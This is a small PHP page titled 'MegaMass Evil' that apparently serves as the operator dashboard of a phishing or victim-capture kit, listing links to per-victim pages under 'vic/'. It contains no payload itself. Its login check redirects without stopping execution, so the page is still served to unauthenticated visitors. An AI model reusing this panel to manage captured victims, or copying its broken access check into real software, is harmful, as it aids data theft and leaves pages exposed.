<?php 
error_reporting(0);
session_start();
if($_SESSION['user'] == ''){
	header("location: login.php");
}

if(isset($_GET['log'])){
	if($_GET['log'] == 'out'){
		session_start();
		unset($_SESSION['user']);
		session_destroy();
		session_unset();
		header("location: login.php");
	}
}

?>

<html>
<head>
<style>
*{outline:none; font-weight:bold;}
body{background:black; color:white;}
button{margin:5px; background:orange; outline:none; cursor:pointer; color:white; border-radius:5px; border:none; padding:5px;
}
button:hover{background:red;}
</style>
</head>
<body>
<center>
<h1>MegaMass Evil</h1>
<a href="?log=out"><button style="width:30%;">log out</button></a>
<h1></h1>

<a href='vic/::1.html' target='_blank'><button class='but'> ::1 (Unknown) </button></a>
<a href='vic/::1.html' target='_blank'><button class='but'> ::1 (Unknown) </button></a>
<a href='vic/::1.html' target='_blank'><button class='but'> ::1 (Unknown) </button></a>
<a href='vic/::1.html' target='_blank'><button class='but'> ::1 (Unknown) </button></a>
<a href='vic/::1.html' target='_blank'><button class='but'> ::1 (Unknown) </button></a>